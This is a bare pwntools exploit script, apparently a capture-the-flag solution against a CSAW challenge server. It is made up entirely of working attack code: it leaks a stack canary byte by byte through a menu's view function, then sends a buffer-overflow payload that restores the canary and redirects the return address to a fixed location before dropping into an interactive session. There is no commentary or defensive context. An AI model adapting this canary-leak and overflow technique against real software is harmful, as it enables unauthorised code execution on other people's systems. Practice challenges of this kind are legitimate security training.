from pwn import *
context.log_level='debug'
context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("pwn.csaw.io",7900)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b"> ",c)
def show(idx):
    cmd(b'V')
    sla(b": ",str(idx).encode())
    ru(b': ')
    return int(ru(b"\n"),16)
def edit(c):
    cmd(b'F')
    s(c)
# gdb.attach(p,'b *0x804950B')
canary = 0
for x in range(0x4):
    canary += show(0x84-x)
    canary *= 0x100
canary = canary &0xffffffff
info(hex(canary))

cmd(b'E')
sla(b": ","1000")
payload = 0x40*b'\0'+flat([canary,0,0x8049304])
s(payload)

p.interactive()